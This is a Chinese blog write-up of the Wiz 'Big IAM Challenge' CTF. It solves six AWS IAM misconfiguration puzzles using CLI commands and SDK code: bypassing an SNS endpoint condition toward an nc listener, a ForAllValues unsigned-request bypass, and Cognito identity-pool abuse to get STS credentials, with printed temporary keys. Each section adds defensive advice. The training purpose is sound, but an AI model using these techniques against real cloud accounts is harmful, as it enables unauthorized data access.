---
title: WIZ IAM 挑战赛 Writeup

---

<center><h1>WIZ IAM 挑战赛 Writeup</h1></center>

---

最近 WIZ 出了一个云安全相关的 CTF 挑战赛：The Big IAM Challenge，挑战赛地址：[bigiamchallenge.com](https://bigiamchallenge.com/)

自己也尝试做了一下，整个过程还是能学习到很多东西的，下面是我自己答题过程中的一个记录。

<div align=center><img width="700" src="/img/1688698467.png" div align=center/></div>

## 1. Buckets of Fun

第一题是叫 Buckets of Fun，基本上 CTF 的第一题都是送分题，这里也不例外。

题目中给出了一个 Bucket 的 Policy 内容如下：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

从策略里可以看到，这个存储桶具有公开列对象和公开读取的权限，由于题目里已经给出了 Bucket 名称，我们拼接下完整的 URL 为：[https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com](https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/)

直接访问这个地址，就可以看到 FLAG 所对应的 Key

<img width="900" src="/img/1688698501.png"></br>

访问这个 Key 即可得到 FLAG 内容。

<img width="900" src="/img/1688698538.png"></br>

这个题目可以告诉我们，对于存储桶应该避免允许公开访问以及避免允许公开列对象，防止敏感信息遭到泄露。

## 2. Google Analytics

第二题叫 ~~Google~~ Analytics，给出的 Policy 如下：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

这个 Policy 授予了所有人拥有这个 SQS 队列的发送、接收消息的权限。

SQS (Simple Queue Service) 可以用来帮助不同的应用程序之间进行可靠的消息传递，它就像是一个消息中转站，可以把消息从一个地方发送到另一个地方，确保消息的安全送达和处理，让应用程序之间更好地进行通信和协作。

根据官方文档，要调用 Receive Message 接口，需要知道 Queue URL，Queue URL 的主要构成部分就是 Account ID 和 Queue，在题目的 Policy 中给出了 Account ID 和 Queue 的值，那么我们就可以构造这个 Queue URL 了，构造后的 Queue URL 为：[https://queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2](https://queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2)

最后，使用 AWS CLI 的 SQS 服务里的 receive-message 接口，利用 --queue-url 参数指定这个队列的 URL 地址。

```bash
aws sqs receive-message --queue-url https://queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
```

此时可以在响应中看到一个 URL 地址。

<img width="1000" src="/img/1688698682.png"></br>

访问这个 URL 地址就可以看到 FLAG 了。

<img width="900" src="/img/1688698726.png"></br>

这个题目告诉我们，对于 SQS 服务，应该避免允许公开接收队列的消息，避免在传输消息时造成敏感信息的泄露。

## 3. Enable Push Notifications

第 3 道题叫 Enable Push Notifications，给出的 Policy 如下：

```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

这个 Policy 允许 Endpoint 结尾是 @tbic.wiz.io 的人拥有这个 SNS 服务的 Subscribe 权限。

SNS（Simple Notification Service）可以帮助开发人员向移动设备、电子邮件、消息队列等多种终端发送通知消息，让你能够轻松地向用户传递重要信息和实时更新。简单来说，SNS 就像是一个消息广播系统，让你能够快速、可靠地将消息发送给订阅者，确保他们及时收到你发送的通知。

AWS CLI 中的 SNS Subscribe 功能里需要指定协议、通知端点以及 ARN，在 Policy 中我们已经知道 ARN 了，接下来就需要去构造一个通知端点，而且这个通知端点需要以 @tbic.wiz.io 结尾。

```bash
> aws sns subscribe help

subscribe
--topic-arn <value>
--protocol <value>
[--notification-endpoint <value>]
```

查阅官方文档可以知道，通知协议支持 HTTP、HTTPS、EMAIL、SMS、SQS 等等，这里我们可以构造一个 HTTP 的通知端点，例如 [http://123.123.123.123:800/@tbic.wiz.io](http://123.123.123.123:800/@tbic.wiz.io)，这样就符合这个 Policy 里的条件了，然后当我们执行订阅命令时，就会收到来自对方的消息。

那么先在自己的服务器上，使用 NC 监听一个端口。

```bash
nc -lvk 80
```

然后执行以下命令：

```bash
aws sns subscribe --protocol http --notification-endpoint http://123.123.123.123:800/@tbic.wiz.io --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications
```

此时，NC 就会收到一个请求，在请求中有一个 Token，待会儿会用到。

<img width="800" src="/img/1688698763.png"></br>

根据官方文档的描述，在进行 Subscribe 时，如果当前和订阅的主题不在一个 AWS 账号下，还需要进行确认操作，在进行确认操作的时候，就需要使用主题返回的 Token 值了。

我们使用以下命令进行确认操作。

```bash
aws sns confirm-subscription --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --token 336412f37fb687f5d51e6e2425c464de257ebd13d0594......
```

当我们执行完这条命令后，等待一会儿，在服务器上就可以接收到包含 FLAG 的消息了。

<img width="800" src="/img/1688698787.png"></br>

可以看到题目难度开始加大了，这里除了利用权限公开访问外，还涉及到了对 Policy 中限定条件的绕过。

因此我们在编写 Policy 的时候，除了注意权限不要设置过大外，还应该注意 Policy 中是否有可能被绕过的地方。

## 4. Admin only?

第 4 题的名字叫 "Admin only?"，给出的 Policy 如下：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

可以看到，这道题是和 S3 相关的，思路还是和第一题一样，先找到 FLAG 的 Key，然后拼接访问 FLAG 的地址即可。

那么，现在的目标就是获取到这个 FLAG 的 Key，但是我们从 Policy 里可以看到这个存储桶只对 arn:aws:iam::133713371337:user/admin 主体授予了 ListBucket 权限，所以现在要解决的问题就是，怎么绕过这个限制。

查阅官方文档，我们可以得到这样的一条信息：对于 ForAllValues，如果请求中没有键或者键值解析为空数据集（如空字符串），则也会返回 true，不要使用带有 Allow 效果的 ForAllValues，因为这样可能会过于宽容。

也就是说，如果我们把请求中的 aws:PrincipalArn 至为空，这里就会返回 True，那么就可以绕过了。

此时我们先发送一条包含 aws:PrincipalArn 的请求。

```bash
> aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/'

An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied
```

可以看到提示访问被拒绝，然后加上 `--no-sign-request` 试试。

```bash
> aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/' --no-sign-request

{
    "Contents": [
        {
            "Key": "files/flag-as-admin.txt",
            "LastModified": "2023-06-07T19:15:43+00:00",
            "ETag": "\"e365cfa7365164c05d7a9c209c4d8514\"",
            "Size": 42,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "files/logo-admin.png",
            "LastModified": "2023-06-08T19:20:01+00:00",
            "ETag": "\"c57e95e6d6c138818bf38daac6216356\"",
            "Size": 81889,
            "StorageClass": "STANDARD"
        }
    ]
}
```

可以看到，此时就返回了存储桶里的对象了，然后我们访问 FLAG 即可。

<img width="900" src="/img/1688699129.png"></br>

在使用命令行操作的时候，因为默认会带上自己 AWS CLI 上所配置的身份信息，所以这里我们需要加上 `--no-sign-request`去绕过，但我们使用浏览器访问的时候，其实本身就不包含身份信息的，所以这里有个更简单的做法，就是直接使用浏览器访问，然后加上前缀就行了。

<img width="900" src="/img/1688699141.png"></br>

这题告诉我们，在策略中即使配置了授权主体，也不一定就是安全的，还要注意有没有使用 ForAllValues，那么我们应该如何防范呢，其实只要把 ForAllValues 替换成 ForAnyValue 就行了，如果键值是空值的话，ForAnyValue 会返回 False，而不是 True，此时我们如果是未授权的访问就会提示 AccessDenied 了。

<img width="1000" src="/img/1688699176.png"></br>

## 5. Do I know you?

第 5 题的名字叫 "Do I know you?"，题目信息是：“我们将 AWS Cognito 配置为我们的主要身份提供商，希望我们没有犯任何错误。”，题目给的 Policy 是：

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "VisualEditor0",
      "Effect": "Allow",
      "Action": [
        "mobileanalytics:PutEvents",
        "cognito-sync:*"
      ],
      "Resource": "*"
    },
    {
      "Sid": "VisualEditor1",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::wiz-privatefiles",
        "arn:aws:s3:::wiz-privatefiles/*"
      ]
    }
  ]
}
```

根据题目信息，可以得知这道题和 AWS Cognito 有关，并且 Cognito 这块儿的配置应该是有问题的。

AWS Cognito 是一项托管服务，可帮助开发人员轻松添加用户身份验证和授权功能到应用程序中。它提供了用于注册、登录和管理用户的功能，支持常见的身份验证方法，如用户名/密码、社交媒体登录和身份提供商集成。Cognito 还提供了用户身份验证的安全性、可伸缩性和可定制性，并与其他 AWS 服务集成，使开发人员能够构建安全可靠的应用程序。

那么这里需要先了解下，如何使用 Cognito，根据官方文档的描述，要使用 Cognito 需要先创建一个 Amazon Cognito 身份池，然后填入创建的身份池 ID 去调用 SDK 获取临时凭证，最后通过临时凭证去操作资源。

这里我一开始使用自己创建的身份池做了下测试，发现提示没有权限，这也是理所当然的，那么下面我们就需要找到对方的身份池 ID 是什么，后来才知道，原来这个身份池 ID 就放在了这个 CTF 题目网页的源代码里。

<img width="1000" src="/img/1688699198.png"></br>

有了身份池 ID，就可以通过 SDK 调用相关服务了，这里可以直接用 ChatGPT 去生成相关代码，不过代码可能会有点小问题，需要手动调一下，下面是一个可用的代码。

```html
<!DOCTYPE html>
<html>
<head>
    <title>Cognito JavaScript SDK Example</title>
    <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
</head>
<body>
    <script>
        // 初始化AWS SDK配置
        AWS.config.region = 'us-east-1';
        AWS.config.credentials = new AWS.CognitoIdentityCredentials({
            IdentityPoolId: 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
        });
        // 获取临时凭证
        AWS.config.credentials.get(function(err) {
            if (!err) {
                // 凭证获取成功
                var accessKeyId = AWS.config.credentials.accessKeyId;
                var secretAccessKey = AWS.config.credentials.secretAccessKey;
                var sessionToken = AWS.config.credentials.sessionToken;

                // 进行后续操作，如访问S3
                accessS3(accessKeyId, secretAccessKey, sessionToken);
            } else {
                // 凭证获取失败
                console.error('Error retrieving credentials: ' + err);
            }
        });
        // 使用临时凭证访问S3
        function accessS3(accessKeyId, secretAccessKey, sessionToken) {
            var s3 = new AWS.S3({
                accessKeyId: accessKeyId,
                secretAccessKey: secretAccessKey,
                sessionToken: sessionToken,
            });
            var params = {
                Bucket: 'wiz-privatefiles',
            };
            s3.getSignedUrl('listObjectsV2', params, function(err, data) {
                if (!err) {
                    // S3存储桶列表获取成功
                    console.log(data);
                } else {
                    // S3存储桶列表获取失败
                    console.error('Error listing S3 buckets: ' + err);
                }
            });
        }
    </script>
</body>
</html>
```

使用浏览器打开这个 HTML 文件，在 Console 中可以看到输出了一行地址。

<img width="800" src="/img/1688699225.png"></br>

访问它，就可以看到存储桶里的对象被列出了。

<img width="800" src="/img/1688699245.png"></br>

这里可以得知 FLAG 的 Key 是 flag1.txt，然后把代码修改下，改成读这个对象。

```html
<!DOCTYPE html>
<html>
<head>
    <title>Cognito JavaScript SDK Example</title>
    <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
</head>
<body>
    <script>
        // 初始化AWS SDK配置
        AWS.config.region = 'us-east-1';
        AWS.config.credentials = new AWS.CognitoIdentityCredentials({
            IdentityPoolId: 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
        });
        // 获取临时凭证
        AWS.config.credentials.get(function(err) {
            if (!err) {
                // 凭证获取成功
                var accessKeyId = AWS.config.credentials.accessKeyId;
                var secretAccessKey = AWS.config.credentials.secretAccessKey;
                var sessionToken = AWS.config.credentials.sessionToken;

                // 进行后续操作，如访问S3
                accessS3(accessKeyId, secretAccessKey, sessionToken);
            } else {
                // 凭证获取失败
                console.error('Error retrieving credentials: ' + err);
            }
        });
        // 使用临时凭证访问S3
        function accessS3(accessKeyId, secretAccessKey, sessionToken) {
            var s3 = new AWS.S3({
                accessKeyId: accessKeyId,
                secretAccessKey: secretAccessKey,
                sessionToken: sessionToken,
            });
            var params = {
                Bucket: 'wiz-privatefiles',
                Key: 'flag1.txt',
            };
            s3.getSignedUrl('getObject', params, function(err, data) {
                if (!err) {
                    // S3存储桶对象获取成功
                    console.log(data);
                } else {
                    // S3存储桶对象获取失败
                    console.error('Error get S3 bucket object: ' + err);
                }
            });
        }
    </script>
</body>
</html>
```

用浏览器打开这段 HTML，复制打开 Console 中的链接，就可以得到 FLAG 了。

<img width="900" src="/img/1688699266.png"></br>

在这题里，可以得知，平时应该保护好自己的身份池 ID，另外身份池类型有不允许匿名访问和允许匿名访问这两种，在创建身份池的时候，我们应该选择使用不允许匿名访问的。

<img width="1000" src="/img/1688699289.png"></br>

如果设置了不允许匿名访问，那么我们在匿名访问的情况下去调用它的话，就会提示未授权访问，而不是直接生成临时令牌了。

<img width="900" src="/img/1688699306.png"></br>

## 6. One final push

第 6 题，也是最后一题，这题叫 One final push，题目内容是：“匿名访问已被禁止，现在看看你能做什么，现在尝试使用经过身份验证的角色：
arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role”，题目给出的 Policy 如下：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

可以看到，这题其实是上一道题的延伸，身份池 ID 都是一样的。

在 Policy 的 Action 中有个利用 AssumeRoleWithWebIdentity 生成 STS 的行为。

通过查看官方文档可以知道，想利用 AssumeRoleWithWebIdentity 生成 STS 需要知道三个东西。

```bash
> aws sts assume-role-with-web-identity help

--role-arn <value>
--role-session-name <value>
--web-identity-token <value>
```

其中 role-arn 题目已经给我们了，role-session-name 我们自己随便起一个就行，那么最后剩下的就是 web-identity-token 了。

根据官方文档和询问 ChatGPT，web-identity-token 可以通过身份池 ID 去获得，而且生成 Token 的相关接口都是公开的，可以被直接调用，不需要授权。

要获取 Token，首先我们需要用这个身份池 ID 获取到它的身份 ID。

```bash
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b

{
    "IdentityId": "us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db"
}
```

然后使用这个身份 ID 获取 Token，这个接口也是公共接口，不需要任何权限。

```bash
> aws cognito-identity get-open-id-token --identity-id us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db

{
    "IdentityId": "us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db",
    "Token": "eyJraWQiOiJ1cy1lYXN0Lxxxx..."
}
```

最后利用上述信息，就可以调用 assume-role-with-web-identity 生成一个 STS 了。

```bash
> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name teamssix --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoi...

{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXDFQ6KRE3",
        "SecretAccessKey": "Wqk43MfgwPM5F7Z9IfFgv24RwHuCVDh8M0swTUyj",
        "SessionToken": "IQoJb3JpZ2luX2VjEND...",
        "Expiration": "2023-07-06T16:36:18+00:00"
    },
    "SubjectFromWebIdentityToken": "us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:teamssix",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/teamssix"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
```

最后使用环境变量配置这个 STS。

```bash
> export AWS_ACCESS_KEY_ID=ASIARK7LBOHXDFQ6KRE3
> export AWS_SECRET_ACCESS_KEY=Wqk43MfgwPM5F7Z9IfFgv24RwHuCVDh8M0swTUyj
> export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEND...
```

然后列下当前存储桶，其实这些存储桶就是上面所有题里用到的存储桶。

```bash
> aws s3 ls

2023-06-05 01:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 21:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-05 00:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 21:28:31 wiz-privatefiles
2023-06-05 21:28:31 wiz-privatefiles-x1000
```

最后，在 wiz-privatefiles-x1000 存储桶下找到 FLAG 文件。

```bash
aws s3api get-object --bucket wiz-privatefiles-x1000 --key flag2.txt flag2.txt
```

<img width="900" src="/img/1688699331.png"></br>

结束，拿到最后一个 FLAG。

到这里，其实可以得到一个结论，就是在拿到身份池 ID 以及所对应的角色 ARN 时，通过这两条信息，可以获取到对应角色的权限，因此平时应该注意，不要将这些信息泄露。

最后，通过上面这 6 道题，个人觉着还是能学习到不少东西的，在整个过程中需要查阅大量的官方文档，ChatGPT 也是个很好的辅助工具，另外这里也参考了一些其他人的 WP，我所参考的资料都放在参考链接了，在你去做这个 IAM 挑战赛的时候，以上内容或许可以帮助到你。

> 参考链接：
>
> 1. [https://docs.aws.amazon.com/zh_cn/AWSSimpleQueueService/latest/SQSDeveloperGuide/welcome.html](https://docs.aws.amazon.com/zh_cn/AWSSimpleQueueService/latest/SQSDeveloperGuide/welcome.html)
> 2. [https://docs.aws.amazon.com/cli/latest/reference/sqs/receive-message.html](https://docs.aws.amazon.com/cli/latest/reference/sqs/receive-message.html)
> 3. [https://docs.aws.amazon.com/zh_cn/sns/latest/dg/welcome.html](https://docs.aws.amazon.com/zh_cn/sns/latest/dg/welcome.html)
> 4. [https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html](https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html)
> 5. [https://docs.aws.amazon.com/cli/latest/reference/sns/confirm-subscription.html](https://docs.aws.amazon.com/cli/latest/reference/sns/confirm-subscription.html)
> 6. [https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html#reference_policies_multi-key-or-value-conditions](https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html#reference_policies_multi-key-or-value-conditions)
> 7. [https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/getting-started-with-identity-pools.html](https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/getting-started-with-identity-pools.html)
> 8. [https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-id.html](https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-id.html)
> 9. [https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-open-id-token.html](https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-open-id-token.html)
> 10. [https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html)
> 11. [https://medium.com/@ayush.guha/ctf-thebigiamchallenge-walkthrough-534d727eb0d8](https://medium.com/@ayush.guha/ctf-thebigiamchallenge-walkthrough-534d727eb0d8)
> 12. [https://zhuanlan.zhihu.com/p/640694595](https://zhuanlan.zhihu.com/p/640694595)

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2023 年 7 月 9 日"
    }
  }
</script>
